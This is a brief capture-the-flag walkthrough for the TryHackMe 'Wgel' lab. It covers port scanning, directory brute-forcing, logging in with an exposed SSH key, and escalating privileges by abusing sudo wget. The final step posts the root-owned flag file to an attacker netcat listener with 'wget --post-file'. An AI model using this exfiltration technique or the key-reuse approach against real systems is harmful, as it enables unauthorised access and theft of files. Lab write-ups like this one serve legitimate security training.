# Wgel THM CTF Walkthrough

## First Step: Reconnaissance

```sh
nmap -sV -sC -Pn -A 10.10.210.35
```

Here we see only port 20 (ssh) and 80 (http) are open.
Next step is to visit the webpage where we see the default Apache page, nothing really interesting yet. <br>

Although, We did get the username jessie in the source code of the page.

## Directory Brute-Forcing

Using `Gobuster alternative`:
```sh
gobuster -u http://10.10.14.80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt dir
```

We found `/sitemap`, which is interesting So, did another gobuster search which gave ./ssh <br>

Copy this Key. <br>

Give it executable permission and run ssh. <br>


```sh
chmod 600 id_rsa1
ssh jessie@10.10.214.80 -i id_rsa1
```

We easily got user flag
```sh
find / -type f -name user_flag.txt 2>>/dev/null
cat /home/jessie/Documents/user_flag.txt
```

Let's try to escalate priviledges.
```sh
sudo -l
```

We can run sudo wget without password.

```sh
nc -nlvp 4445
```

Let's Open netcat listener (The screenshot is older one with port 1234. Don't confuse it, You can use any port but remeber to keep the same port on both sides.) <br>

```sh
sudo /usr/bin/wget --post-file=/root/root_flag.txt http://10.17.88.138:1234
```

Check the Netcat listener. We have recieved the root flag.


## Congrats!
## We have solved Wgel CTF!
## Follow My GitHub for more.

